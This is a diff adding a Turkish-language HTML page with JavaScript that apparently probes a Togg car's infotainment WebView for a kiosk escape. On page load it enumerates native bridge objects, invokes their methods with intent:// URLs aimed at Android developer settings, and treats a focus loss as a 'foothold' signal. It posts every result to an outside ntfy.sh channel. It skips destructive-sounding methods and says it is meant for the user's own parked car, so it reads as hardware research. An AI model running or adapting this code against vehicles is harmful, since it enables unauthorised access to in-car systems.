@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="color-scheme" content="dark">
+<title>Togg IVI — KILL Invoke / Probe</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="tabs">
+  <a href="index.html">🎯 Bypass</a>
+  <a href="probe.html">🔬 Ortam</a>
+  <a href="klavye.html">⌨️ Klavye</a>
+  <a href="intent.html">🚪 Intent</a>
+  <a href="uach.html">🧬 Sürüm</a>
+  <a href="surface.html">🕸️ Yüzey</a>
+  <a href="kill.html">☠️ KILL</a>
+  <a class="active" href="invoke.html">⚡ Invoke</a>
+</nav>
+
+<h1>⚡ KILL Invoke / Kademeli Probe</h1>
+<p class="sub" style="border:1px solid #e63946;border-radius:8px;padding:8px;background:#2a1013">
+<b>⚠ Native metot ÇAĞIRIR.</b> Park + motor kapalı. Yıkıcı isimler (reboot/wipe/erase/uninstall/delete/kill/lock…) <b>atlanır</b>.
+Kademe: <code>no-arg</code> → <code>""</code> → <code>benign https://example.com</code> → <code>intent:// Settings</code>.
+Aktivite açılırsa (blur/visibility/pagehide) = <b>kiosk escape = foothold</b> sinyali. Her adım ntfy'ye akar.</p>
+
+<div id="verdict" class="try"><div class="big">…</div><div class="why">hazırlanıyor</div></div>
+
+<div class="toolbar">
+  <button class="primary" onclick="runAll()">⚡ Topla + probe</button>
+  <button class="reset" onclick="window.__abort=true; post('ABORT kullanıcı')">⛔ Durdur</button>
+  <button onclick="copyOut()">📋 Kopyala</button>
+</div>
+
+<h2 class="section-title">Hedefler (KILL metotlar)</h2>
+<pre id="targets" class="log-box">toplanmadı</pre>
+
+<h2 class="section-title">Invoke akışı (+ ntfy)</h2>
+<pre id="o" class="log-box">init</pre>
+
+<footer>Kendi aracın üzerinde, park hâlinde kullan · <a href="kill.html">← KILL Tarama</a></footer>
+
+<script src="common.js"></script>
+<script>
+"use strict";
+var NT = "https://ntfy.sh/toggx-ivi-7f3k9q2m";
+var PRE = "[invoke] ";
+var MAX_METHODS = 40, STEP_MS = 450;
+var DESTRUCTIVE = ['reboot','shutdown','poweroff','wipe','factory','format','erase','uninstall',
+  'flash','update','delete','remove','revoke','kill','terminate','lock','immobil','brake','steer',
+  'throttle','airbag','horn'];
+var KILL = ['open','start','intent','exec','run','shell','file','read','write','install','url',
+  'load','navigat','share','print','propert','can','vehicle'];
+var killRe = new RegExp(KILL.join('|'), 'i');
+var COMMON = ['AndroidInterface','JSInterface','NativeBridge','WebAppInterface','CarAPI','VehicleAPI',
+  'CarInterface','VehicleInterface','IVIInterface','bridge','app','android','native','nativeApi',
+  'JSBridge','webkit','external','host','service','deviceApi','systemApi','carService',
+  'vehicleService','hmiApi','mediaApi','navApi','climateApi','phoneApi','AOSP','car','vehicle','ivi','hmi'];
+var INTENTS = [
+  "intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;launchFlags=0x10000000;end",
+  "intent:#Intent;action=android.settings.SETTINGS;launchFlags=0x10000000;end"
+];
+
+window.__abort = false;
+var targets = [], findings = [], lastCall = "", escaped = false, armed = false;
+
+function oAppend(s){ var o=document.getElementById("o"); if(o){ o.textContent += "\n" + s; o.scrollTop = o.scrollHeight; } }
+function post(body){ try{ fetch(NT,{method:"POST",mode:"no-cors",body:PRE + body,keepalive:true}); }catch(e){} }
+function emit(s){ oAppend(s); post(s); }
+
+function isDestructive(n){ var l=String(n).toLowerCase(); for(var i=0;i<DESTRUCTIVE.length;i++){ if(l.indexOf(DESTRUCTIVE[i])>=0) return true; } return false; }
+
+function describe(r){
+  if (r === undefined) return "undefined";
+  if (r === null) return "null";
+  var t = typeof r;
+  if (t === 'string') return "string(len=" + r.length + ")";
+  if (t === 'number' || t === 'boolean') return t + "(" + r + ")";
+  if (t === 'object'){ try { return "object(" + (r.constructor && r.constructor.name) + ")"; } catch(e){ return "object"; } }
+  if (t === 'function') return "function";
+  return t;
+}
+
+function safeCall(fn, ctx, arg, hasArg){
+  try{ var r = hasArg ? fn.call(ctx, arg) : fn.call(ctx); return { ok:true, ret: describe(r) }; }
+  catch(e){ var m = (e && (e.name || "")) + ":" + (e && (e.message !== undefined ? e.message : String(e))); return { ok:false, err: m }; }
+}
+
+function markEscape(src){
+  if (!armed || escaped) return;
+  escaped = true;
+  emit("ESCAPE_SIGNAL " + src + " after=" + lastCall);
+}
+
+function collect(){
+  var seenFn = {};
+  COMMON.forEach(function(name){
+    var v; try { v = window[name]; } catch(e){ return; }
+    if (!v || (typeof v !== 'object' && typeof v !== 'function')) return;
+    var names; try { names = Object.getOwnPropertyNames(v); } catch(e){ return; }
+    names.forEach(function(m){
+      var fn; try { fn = v[m]; } catch(e){ return; }
+      if (typeof fn !== 'function') return;
+      if (!killRe.test(m)) return;
+      var key = name + "." + m;
+      if (seenFn[key]) return;
+      seenFn[key] = 1;
+      targets.push({ obj:v, objName:name, m:m, destructive:isDestructive(m) });
+    });
+  });
+  if (targets.length > MAX_METHODS){ targets = targets.slice(0, MAX_METHODS); }
+  document.getElementById('targets').textContent = targets.length
+    ? targets.map(function(t){ return (t.destructive ? "SKIP " : "PROBE ") + t.objName + "." + t.m; }).join("\n")
+    : "KILL metot bulunamadı";
+  emit("TARGETS " + targets.length + " (kills=" + targets.filter(function(t){return !t.destructive;}).length + ")");
+}
+
+function probeOne(t){
+  return new Promise(function(resolve){
+    if (window.__abort){ resolve(); return; }
+    if (t.destructive){ emit("SKIP " + t.objName + "." + t.m + " (yıkıcı)"); resolve(); return; }
+    var fn = t.obj[t.m], ctx = t.obj, base = t.objName + "." + t.m;
+    var rec = { target: base, steps: [] };
+    var steps = [
+      { name:"noarg",  arg:null, has:false },
+      { name:"empty",  arg:"", has:true },
+      { name:"benign", arg:"https://example.com", has:true }
+    ];
+    INTENTS.forEach(function(s, i){ steps.push({ name:"intent"+i, arg:s, has:true, intent:true }); });
+
+    var i = 0;
+    (function next(){
+      if (window.__abort || i >= steps.length){
+        findings.push(rec);
+        emit("PROBE " + base + " => " + JSON.stringify(rec.steps));
+        setTimeout(resolve, STEP_MS);
+        return;
+      }
+      var st = steps[i++];
+      lastCall = base + ":" + st.name;
+      if (st.intent) armed = true;
+      var r = safeCall(fn, ctx, st.arg, st.has);
+      var line = st.name + "=" + (r.ok ? ("ok/" + r.ret) : ("throw/" + r.err));
+      rec.steps.push(line);
+      emit(base + " " + line);
+      if (st.intent) armed = false;
+      if (escaped){ findings.push(rec); resolve(); return; }
+      setTimeout(next, STEP_MS);
+    })();
+  });
+}
+
+function runAll(){
+  window.__abort = false; escaped = false; findings = []; targets = [];
+  if (window.__kill && window.__kill.kills && window.__kill.kills.length){
+    emit("NOT kill.html önce koştu (kills=" + window.__kill.kills.length + ") — yine toplanıyor");
+  }
+  document.getElementById('verdict').className = 'try';
+  document.getElementById('verdict').querySelector('.big').textContent = '…';
+  document.getElementById('verdict').querySelector('.why').textContent = 'koşuyor';
+  collect();
+  var list = targets.slice();
+  var idx = 0;
+  (function walk(){
+    if (window.__abort || idx >= list.length){ finish(); return; }
+    probeOne(list[idx++]).then(walk, walk);
+  })();
+}
+
+function finish(){
+  var v;
+  if (escaped) v = { c:'ok', t:'FOOTHOLD SİNYALİ', s:'invoke sonrası aktivite açıldı (blur/visibility/pagehide)' };
+  else if (findings.some(function(f){ return f.steps.some(function(s){ return s.indexOf('intent')>=0 && s.indexOf('=ok/')>=0; }); })) v = { c:'ok', t:'INTENT SINK (return ok)', s:'intent arg ile throw etmedi → navigasyon/aktivite yolu' };
+  else if (findings.length) v = { c:'try', t:'PROBE BİTTİ', s: findings.length + ' hedef; kaçış sinyali yok (throw/engel)' };
+  else v = { c:'bad', t:'HEDEF YOK', s:'çağrılabilir KILL metot yok' };
+  var box = document.getElementById('verdict'); box.className = v.c;
+  box.querySelector('.big').textContent = v.t; box.querySelector('.why').textContent = v.s;
+  window.__invoke = { findings: findings, verdict: v, escaped: escaped };
+  emit("SUMMARY " + JSON.stringify({ verdict: v.t, escaped: escaped, findings: findings.slice(0,10) }));
+}
+
+function copyOut(){
+  var txt = JSON.stringify(window.__invoke || { findings: findings }, null, 2);
+  try { navigator.clipboard.writeText(txt).then(function(){ alert("Kopyalandı"); }, function(){ alert(txt); }); }
+  catch(e){ alert(txt); }
+}
+
+document.addEventListener('visibilitychange', function(){ if (document.hidden) markEscape('visibilitychange'); });
+window.addEventListener('blur', function(){ markEscape('blur'); });
+window.addEventListener('pagehide', function(){ markEscape('pagehide'); });
+
+window.addEventListener('load', function(){ setTimeout(runAll, 800); });
+</script>
+</body>
+</html>
